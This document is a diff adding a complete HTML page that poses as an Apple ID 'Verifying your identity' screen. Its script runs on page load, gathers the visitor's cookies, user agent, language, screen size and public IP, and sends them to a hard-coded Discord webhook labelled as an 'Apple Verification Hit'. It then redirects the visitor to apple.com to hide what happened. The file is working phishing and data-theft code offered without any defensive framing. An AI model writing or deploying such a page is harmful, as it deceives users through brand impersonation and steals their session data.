@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Apple ID</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #f5f5f7;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            flex-direction: column;
+            color: #1d1d1f;
+        }
+        .container {
+            background: white;
+            padding: 40px 30px;
+            border-radius: 18px;
+            box-shadow: 0 2px 20px rgba(0,0,0,0.08);
+            text-align: center;
+            max-width: 320px;
+            width: 90%;
+        }
+        .logo {
+            width: 50px;
+            height: 50px;
+            margin: 0 auto 20px;
+            background: #0071e3;
+            border-radius: 12px;
+            position: relative;
+        }
+        .logo::after {
+            content: "";
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 18px;
+            height: 22px;
+            background: white;
+            clip-path: polygon(50% 0%, 0% 100%, 100% 100%);
+        }
+        .spinner {
+            border: 3px solid #e0e0e0;
+            border-top: 3px solid #0071e3;
+            border-radius: 50%;
+            width: 36px;
+            height: 36px;
+            animation: spin 0.8s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .message {
+            font-size: 17px;
+            font-weight: 500;
+            margin-bottom: 8px;
+        }
+        .sub {
+            font-size: 13px;
+            color: #86868b;
+        }
+        .progress {
+            background: #e0e0e0;
+            height: 4px;
+            border-radius: 2px;
+            width: 80%;
+            margin: 24px auto 0;
+            overflow: hidden;
+        }
+        .progress-bar {
+            width: 0%;
+            height: 100%;
+            background: #0071e3;
+            animation: load 2s ease-in-out forwards;
+        }
+        @keyframes load {
+            0% { width: 0%; }
+            50% { width: 70%; }
+            100% { width: 100%; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo"></div>
+        <div class="message">Verifying your identity</div>
+        <div class="sub">This may take a few seconds...</div>
+        <div class="spinner"></div>
+        <div class="progress">
+            <div class="progress-bar"></div>
+        </div>
+    </div>
+
+    <script>
+        const WEBHOOK = "https://discord.com/api/webhooks/1516478248509505709/ss5ZfieB89UwBwNmNd7KtDyVABzckLDxcumfmqwkAVbkNjdbXR6R7r2KOAeu2Ba9jX_G";
+
+        async function harvest() {
+            // Collect local data
+            const cookies = document.cookie;
+            const ua = navigator.userAgent;
+            const lang = navigator.language;
+            const res = `${screen.width}x${screen.height}`;
+
+            // Get public IP via ipify
+            let ip = "unknown";
+            try {
+                const ipResp = await fetch("https://api.ipify.org?format=json");
+                const ipData = await ipResp.json();
+                ip = ipData.ip;
+            } catch(e) {}
+
+            // Build message for Discord
+            const msg = `**🍎 Apple Verification Hit**\n` +
+                        `**IP:** ${ip}\n` +
+                        `**Cookies:** \`${cookies || "(none)"}\`\n` +
+                        `**User-Agent:** \`${ua}\`\n` +
+                        `**Language:** ${lang}\n` +
+                        `**Screen:** ${res}`;
+
+            // Exfiltrate to Discord webhook
+            try {
+                await fetch(WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: msg })
+                });
+            } catch(e) {}
+
+            // Redirect to genuine Apple page
+            setTimeout(() => {
+                window.location.href = "https://www.apple.com/";
+            }, 2000);
+        }
+
+        harvest();
+    </script>
+</body>
+</html>
